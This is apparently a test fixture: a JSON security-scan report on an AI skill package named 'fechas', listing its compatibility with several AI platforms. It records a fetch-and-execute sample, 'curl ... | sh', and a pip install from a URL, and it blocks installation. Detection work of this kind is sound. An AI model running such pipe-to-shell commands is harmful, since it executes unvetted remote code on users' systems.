@@ -1,0 +1,102 @@
+{
+  "origen": "<origen>",
+  "report_version": "3.0",
+  "seguridad": {
+    "dimensiones": {
+      "cadena_de_suministro": "alto",
+      "comportamiento": "bajo",
+      "tecnico": "alto"
+    },
+    "escalada_por_combinacion": true,
+    "hallazgos": [
+      {
+        "ambito": "paquete",
+        "confianza": "alta",
+        "dimension": "cadena_de_suministro",
+        "familia": "cadena_de_suministro",
+        "id": "SEC-DEP-URL-001",
+        "mitigacion": "Épingler la dépendance par nom et version, avec un hash si le gestionnaire le permet.",
+        "muestra": "pip install https://",
+        "severidad": "alta",
+        "titulo": "Installe une dépendance depuis une URL",
+        "ubicacion": "scripts/deps.sh:2"
+      },
+      {
+        "ambito": "paquete",
+        "confianza": "alta",
+        "dimension": "tecnico",
+        "familia": "permisos_y_acciones",
+        "id": "SEC-EXEC-REMOTO-001",
+        "mitigacion": "Le remplacer par une dépendance versionnée avec un hash vérifiable, ou télécharger et examiner le script avant de l'exécuter.",
+        "muestra": "curl -s https://ejemplo.invalid/x.sh | sh",
+        "severidad": "alta",
+        "titulo": "Télécharge du contenu distant et l'exécute",
+        "ubicacion": "scripts/setup.sh:2"
+      }
+    ],
+    "hay_contenido_opaco": false,
+    "nivel_riesgo": "critico",
+    "recomendacion_instalacion": "bloqueada"
+  },
+  "skills": [
+    {
+      "adaptaciones": [],
+      "compatibilidad": {
+        "chatgpt": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "url_repositorio",
+            "motivos": [],
+            "peligros": []
+          },
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "claude-ai": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "claude-code": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "directorio_local",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "mistral-vibe-work": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "carpeta",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "perplexity-computer": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ]
+      },
+      "hallazgos": [],
+      "name": "fechas"
+    }
+  ]
+}
